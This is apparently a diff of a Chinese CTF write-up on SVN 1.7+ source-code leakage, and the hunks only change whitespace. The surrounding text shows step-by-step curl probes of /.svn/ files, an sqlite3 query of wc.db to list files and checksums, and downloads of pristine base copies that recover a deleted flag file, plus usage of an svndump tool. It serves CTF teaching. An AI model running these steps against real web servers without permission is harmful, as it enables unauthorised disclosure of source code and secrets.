@@ -12,23 +12,23 @@
 
 ```mermaid
 flowchart LR
-    A[开发者 svn checkout] --> B[生成 .svn/]
-    B --> C[开发者把项目部署到 web 服务器]
-    C --> D[/.svn/wc.db 可直接 HTTP 下载]
-    D --> E[解密 SQLite → 拿到文件清单]
-    E --> F[下载 pristine 基础副本 → 还原源码]
+ A[开发者 svn checkout] --> B[生成 .svn/]
+ B --> C[开发者把项目部署到 web 服务器]
+ C --> D[/.svn/wc.db 可直接 HTTP 下载]
+ D --> E[解密 SQLite → 拿到文件清单]
+ E --> F[下载 pristine 基础副本 → 还原源码]
 ```
 
 #### SVN 1.7+ 工作副本目录结构
 
 ```
 .svn/
-├── format            ← 数字 "12" = SVN 1.7+ 格式
-├── entries           ← 1.7+ 只放格式号占位（1.6 及以前这里才有文件清单）
-├── wc.db             ← SQLite 数据库：全部文件路径/状态/checksum 元数据
+├── format ← 数字 "12" = SVN 1.7+ 格式
+├── entries ← 1.7+ 只放格式号占位（1.6 及以前这里才有文件清单）
+├── wc.db ← SQLite 数据库：全部文件路径/状态/checksum 元数据
 └── pristine/
-    └── <sha前2位>/
-        └── <完整40位sha>.svn-base   ← 每个文件内容的"基础副本"
+ └── <sha前2位>/
+ └── <完整40位sha>.svn-base ← 每个文件内容的"基础副本"
 ```
 
 | 文件 | 作用 | 泄露价值 |
@@ -46,9 +46,9 @@ SVN 的 pristine 基础副本是**按内容 sha 存储的**——即使工作副
 
 ```bash
 # 最小确认集（三个请求）
-curl -s -o /dev/null -w "%{http_code}" "http://目标/.svn/format"    # 200 + "12" → 1.7+
-curl -s -o /dev/null -w "%{http_code}" "http://目标/.svn/wc.db"     # 200 + 大文件 → 元数据泄露
-curl -s -o /dev/null -w "%{http_code}" "http://目标/.svn/entries"   # 200 + "12" → 占位
+curl -s -o /dev/null -w "%{http_code}" "http://目标/.svn/format" # 200 + "12" → 1.7+
+curl -s -o /dev/null -w "%{http_code}" "http://目标/.svn/wc.db" # 200 + 大文件 → 元数据泄露
+curl -s -o /dev/null -w "%{http_code}" "http://目标/.svn/entries" # 200 + "12" → 占位
 ```
 
 | 状态 | 含义 |
@@ -81,8 +81,8 @@ curl -s -o /dev/null -w "%{http_code}" "http://目标/.svn/wc.db"
 # 2. 下载 wc.db，解析文件清单和 checksum
 curl -s "http://目标/.svn/wc.db" -o wc.db
 sqlite3 wc.db "SELECT path,presence,checksum FROM NODES;"
-# flag_1804218695.txt  not-present  $sha1$aae9bea229cf7fe9085c2556bb9f39adc5ad0b4d
-# index.html           normal       $sha1$bf45c36a4dfb73378247a6311eac4f80f48fcb92
+# flag_1804218695.txt not-present $sha1$aae9bea229cf7fe9085c2556bb9f39adc5ad0b4d
+# index.html normal $sha1$bf45c36a4dfb73378247a6311eac4f80f48fcb92
 
 # 3. 按完整 40 位 sha 下载 pristine 基础副本（关键坑：文件名是完整 sha！）
 curl -s "http://目标/.svn/pristine/aa/aae9bea229cf7fe9085c2556bb9f39adc5ad0b4d.svn-base"
@@ -96,9 +96,9 @@ curl -s "http://目标/.svn/pristine/aa/aae9bea229cf7fe9085c2556bb9f39adc5ad0b4d
 svndump http://目标
 
 # 选项
-svndump http://目标 --list        # 只列出条目，不下载
-svndump http://目标 --out 目录     # 指定输出目录
-svndump http://目标 --cat flag_xxx.txt  # 直接 cat 指定文件
+svndump http://目标 --list # 只列出条目，不下载
+svndump http://目标 --out 目录 # 指定输出目录
+svndump http://目标 --cat flag_xxx.txt # 直接 cat 指定文件
 ```
 
 #### 手动对象链（理解原理）
@@ -118,8 +118,8 @@ python3 -c "import re; [print(s.decode()) for s in re.findall(rb'\\$sha1\\$([0-9
 # bf45c36a4dfb73378247a6311eac4f80f48fcb92
 
 # 4. 拼 pristine 路径下载（注意：文件名 = 完整 40 位，不是 38 位）
-# 错误写法：/.svn/pristine/aa/e9bea229cf7fe9085c2556bb9f39adc5ad0b4d.svn-base  → 404！
-# 正确写法：/.svn/pristine/aa/aae9bea229cf7fe9085c2556bb9f39adc5ad0b4d.svn-base  → 200
+# 错误写法：/.svn/pristine/aa/e9bea229cf7fe9085c2556bb9f39adc5ad0b4d.svn-base → 404！
+# 正确写法：/.svn/pristine/aa/aae9bea229cf7fe9085c2556bb9f39adc5ad0b4d.svn-base → 200
 curl -s "http://目标/.svn/pristine/aa/aae9bea229cf7fe9085c2556bb9f39adc5ad0b4d.svn-base"
 # ctfhub{...}
 ```
